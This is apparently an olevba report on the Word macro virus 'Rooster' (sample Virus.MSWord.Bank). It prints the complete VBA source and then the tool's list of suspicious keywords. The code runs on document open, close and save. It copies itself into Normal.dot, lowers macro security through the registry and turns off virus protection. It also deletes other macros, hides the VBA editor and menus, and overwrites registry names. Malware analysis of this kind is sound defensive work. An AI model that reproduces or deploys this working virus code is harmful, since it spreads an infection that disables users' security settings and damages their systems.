olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bank
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bank - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Rooster.bas 
in file: Virus.MSWord.Bank - OLE stream: 'Macros/VBA/Rooster'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'--->
'            R o o s t e r
' (C) Copyright 1997 - 1999 by Chino
'          Bandung!, Maker
'      free_go_download@yahoo.com

Public Const Tony_Hawk = "Rooster"
Public Const NoseGrind = "\~WRFO006.tmp"
Public Const Rail = "\Installer"
Sub AutoOpen()
Dim Drop_inX                        As Object
Dim Fifty_Fifty                     As Object
Dim Shove_It                        As Object
Dim No_Comply                       As Object
Dim Heel_Flip                       As Boolean
Dim Kick_Flip                       As Boolean
Dim Tail_Slide                      As Variant
Dim Tail_Slide1                     As Variant
Dim No_Slide                        As String
Dim Crooked                         As String
Dim Pumping                         As Integer
Dim Bank                            As String
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Ollie_True
Stl_PANIC_27
AddIns.Unload True
Crooked = Options.DefaultFilePath(12) & Rail
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Security", "Level") = 1&
If Dir(Crooked) = "" Then
   MkDir Crooked
End If
Set Drop_inX = Drop_in
Set No_Comply = ActiveDocument
Set Fifty_Fifty = Drop_in.VBProject.VBComponents
Set Shove_It = No_Comply.VBProject.VBComponents
No_Slide = Options.DefaultFilePath(12) & NoseGrind
Manual
For Each Tail_Slide In Fifty_Fifty
    If Tail_Slide.Type = 1 And Tail_Slide.Name = Tony_Hawk And Fifty_Fifty.Count = 2 Then
       Heel_Flip = True
       Exit For
    End If
Next Tail_Slide
For Each Tail_Slide1 In Shove_It
    If Tail_Slide1.Type = 1 And Tail_Slide1.Name = Tony_Hawk Then
       Kick_Flip = True
       Exit For
    End If
Next Tail_Slide1
    If Heel_Flip = True Then
       If Kick_Flip = False Then
          Fifty_Fifty.Item(Tony_Hawk).Export No_Slide
          Shove_It.import No_Slide
          Crook
       End If
    Else
          Shove_It.Item(Tony_Hawk).Export No_Slide
          Fifty_Fifty.import No_Slide
          Drop_in.Save
    End If
      If Dir(No_Slide) <> "" Then Kill No_Slide
    Options.DefaultFilePath(2) = Crooked
With Drop_in
     If Dir(Crooked & "\Normal.dot") = "" Then
        .OpenAsDocument.SaveAs Crooked & "\Normal.dot"
        .OpenAsDocument.Close -1
     End If
        If Dir(Crooked & "\Email.dot") = "" Then
          .OpenAsDocument.SaveAs Crooked & "\Email.dot"
          .OpenAsDocument.Close -1
        End If
End With
Transfer
End Sub
Sub ViewVB(): End Sub
Sub ViewVBCode(): End Sub
Sub AutoClose(): AutoOpen: End Sub
Sub FileTemplates(): End Sub
Sub ToggleFormsDesign(): End Sub
Sub FileNewDefault()
On Error Resume Next
Documents.Add
AutoOpen
End Sub
Sub Autoexec()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Ollie_True
AddIns.Unload True
Stl_PANIC_27
Manual
Application.OnTime Now + TimeValue("00:00:05"), "Normal.Rooster.Autoopen"
End Sub
Sub Ollie_False()
WordBasic.DisableAutoMacros False
End Sub
Sub Ollie_True()
WordBasic.DisableAutoMacros True
End Sub
Sub FileSave()
Ollie_True
If InStr(1, ActiveDocument.FullName, "\") = 0 Then
   If Dialogs(wdDialogFileSaveAs).Show = 0 Then
      AutoOpen
   Else
      AutoSave
      AutoOpen
   End If
End If
End Sub
Sub AutoSave()
On Error Resume Next
createtmpollie
End Sub
Sub FileOPen()
Ollie_True
If Dialogs(wdDialogFileOpen).Show <> 0 Then
      AutoOpen
End If
Ollie_False
End Sub
Sub FileClose()
Ollie_True
      AutoOpen
      Crook
      ActiveDocument.Close 0
Ollie_False
End Sub
Sub FileNew()
FileNewDefault
End Sub
Sub Crook()
On Error Resume Next
Dim Board               As Object
Set Board = ActiveDocument
If Documents.Count <> 0 Then
    If InStr(1, Board.FullName, "\") <> 0 Then Board.Save
End If
End Sub
Function Drop_in() As Object
On Error Resume Next
Set Drop_in = NormalTemplate
End Function
Sub Stl_PANIC_27()
Dim Ollie_180                       As Object
Dim No_Comply                       As Object
Dim Pumping                         As Integer
On Error Resume Next
Set Ollie_180 = Application
Set No_Comply = ActiveDocument
With Ollie_180
     .EnableCancelKey = wdCancelDisabled
      No_Comply.ReadOnlyRecommended = (50 - 50)
     .ScreenUpdating = (50 - 50)
     .ShowVisualBasicEditor = (50 - 50)
     Options.VirusProtection = (50 - 50)
     Options.SaveNormalPrompt = (50 - 50)
     Options.ConfirmConversions = (50 - 50)
     Options.SavePropertiesPrompt = (50 - 50)
     For Pumping = 1 To CommandBars.Count
        CommandBars(Pumping).Protection = msoBarNoCustomize
     Next Pumping
     CommandBars("Control Toolbox").Enabled = False
     CommandBars("Forms").Enabled = False
     CommandBars("Visual Basic").Enabled = False
     CommandBars("Tools").Controls("Protect Document...").Delete
     CommandBars("Tools").Controls("Templates And Add-Ins...").Delete
     CommandBars("Tools").Controls("Macro").Delete
End With
End Sub
Sub Transfer()
On Error Resume Next
With Dialogs(86)
.Author = "Chino"
.Keywords = "Call me : free_go_download@yahoo.com"
.Comments = "Don't try this at home!"
.Subject = "Windows Protection."
.Title = "Chino.doc"
.Execute
End With
With System
        .PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "DefCompany") = "Deftones"
        .PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "DefName") = "Metal"
        .PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "OrgCompany") = "Chino Soft"
        .PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Metal"
        .PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "Chino"
        .PrivateProfileString("", "HKEY_CURRENT_USER\Software\Classes\CLSID\{21EC2020-3AEA-1069-A2DD-08002B30309D}", "") = "Metal Panel"
        .PrivateProfileString("", "HKEY_CURRENT_USER\Software\Classes\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}", "") = "Chino Document"
        .PrivateProfileString("", "HKEY_CURRENT_USER\Software\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}", "") = "Deftones Trash"
        .PrivateProfileString("", "HKEY_CURRENT_USER\Software\Classes\CLSID\{2227A280-3AEA-1069-A2DE-08002B30309D}", "") = "Printer Metal"
        .PrivateProfileString("", "HKEY_CURRENT_USER\Software\Classes\CLSID\{992CFFA0-F557-101A-88EC-00DD010CCC48}", "") = "Network Chino"
        .PrivateProfileString("", "HKEY_CURRENT_USER\Software\Classes\CLSID\{208D2C60-3AEA-1069-A2D7-08002B30309D}", "") = "Deftones Neighborhood"
        .PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\International", "s1159") = "Windows Panic!"
        .PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\International", "s2359") = "Windows Panic!"
End With
End Sub
Sub fileProperties()
On Error Resume Next
Dim Ps As String
Ps = InputBox("Enter your key value to continue?", "Windows Protection")
If Ps = Mid(NoseGrind, 3, 4) Then
   Application.ShowVisualBasicEditor = True
End If
End Sub
Sub Manual()
On Error Resume Next
Dim no_a        As Object
Dim no_b        As Object
Dim ok_a        As Variant
Dim ok_b        As Variant
Dim no_x        As Object
Dim no_y        As Object
Dim yes_a       As Integer
Dim yes_b       As Integer
Set no_x = ActiveDocument
Set no_y = Drop_in
Set no_a = no_x.VBProject.VBComponents
Set no_b = no_y.VBProject.VBComponents
For Each ok_a In no_a
    If ok_a.Type <> 100 Then
       If ok_a.Name <> Tony_Hawk Then
           no_a.Remove ok_a
       End If
    Else
    yes_a = ok_a.Codemodule.CountOfLines
       If yes_a <> 0 Then ok_a.Codemodule.DeleteLines 1, yes_a
    End If
Next ok_a

For Each ok_b In no_b
    If ok_b.Type <> 100 Then
       If ok_b.Name <> Tony_Hawk Then
           no_b.Remove ok_b
       End If
    Else
    yes_b = ok_b.Codemodule.CountOfLines
       If yes_b <> 0 Then ok_b.Codemodule.DeleteLines 1, yes_b
    End If
Next ok_b
End Sub
Sub createtmpollie()
On Error Resume Next
If InStr(1, ActiveDocument.FullName, "\") <> 0 Then
   Open FileDetail(ActiveDocument.FullName) & Second(Time) & Hour(Time) & Minute(Time) & Int(Rnd * 999) + 10 & "________" For Output As #1
         Print #1, Now & vbCrLf & "Automaticaly from free_go_download@yahoo.com JOIN with Windows System Family"
   Close #1
End If
End Sub
Function FileDetail(Pencarian As String) As String
On Error Resume Next
Dim Find_Short As Long
Dim i As Integer
Dim h
For i = 0 To Len(Pencarian)
Find_Short = InStr(i + 1, Pencarian, "\", vbTextCompare)
If Find_Short > 0 Then
h = Find_Short - 1
End If
Next i
FileDetail = Left(Pencarian, h) & "\"
End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

